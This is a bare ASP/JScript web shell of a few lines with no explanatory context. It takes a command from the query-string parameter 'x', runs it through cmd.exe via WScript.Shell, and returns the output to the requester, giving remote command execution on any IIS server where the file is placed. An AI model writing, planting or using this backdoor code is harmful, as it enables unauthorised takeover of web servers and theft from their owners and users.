'
<pre>
<%
q = Request.QueryString("x")(1)
shell = new ActiveXObject("WScript.Shell")
pipe = shell.Exec("cmd.exe /c \"" + q + "\"")
o = pipe.StdOut.ReadAll() + pipe.StdErr.ReadAll()
Response.write(o)
%>
</pre>